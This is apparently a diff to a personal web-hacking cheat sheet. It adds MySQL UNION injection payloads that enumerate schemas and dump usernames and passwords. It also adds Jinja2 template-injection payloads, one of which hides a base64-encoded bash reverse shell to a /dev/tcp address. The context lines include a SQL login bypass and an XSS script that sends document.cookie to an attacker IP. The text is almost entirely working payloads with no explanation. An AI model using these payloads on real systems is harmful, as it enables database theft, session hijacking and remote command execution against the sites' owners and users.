@@ -107,7 +107,42 @@ username=gfd'+union+select+'password'+--+-&password=password
 ?id=2 and lengthb('foo') = 3         # oracle
 not previous                         # sqlite
 ```
+# mysqli
+get version
+```sql
+UNION SELECT 1,VERSION(),3,4 -- -
+```
+get dbs:
+```sql
+UNION SELECT 1,group_concat(schema_name),3,4 FROM information_schema.schemata -- -
+```
+get tables;
+```sql
+UNION SELECT 1,group_concat(table_schema,':',table_name),3,4 FROM information_schema.tables WHERE table_schema IN ('website','second_project','dev_site')-- -
+```
+get columns:
+```sql
+UNION SELECT 1,group_concat(table_schema,':',column_name),3,4 FROM information_schema.columns WHERE table_schema IN ('website','second_project','dev_site')-- -
+```
+get users and passwords:
+```sql
+UNION SELECT 1,group_concat(username,':',password),3,4 FROM website.users -- - 
+```
+
 ---
+# ssti
+```python
+{% set string = "ssti" %}
+{% set class = "__class__" %}
+{% set mro = "__mro__" %}
+{% set subclasses = "__subclasses__" %}
+
+{% set mro_r = string|attr(class)|attr(mro) %}
+{% set subclasses_r = mro_r[1]|attr(subclasses)() %}
+{{ subclasses_r[420](["/usr/bin/touch","/tmp/das-ist-walter"]) }}
+
+{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} {{a}} {% endwith %}
+```
 # steal cookie
 ```
 <script>window.location='http://<ip>:port/?cookie=' + document.cookie</script>
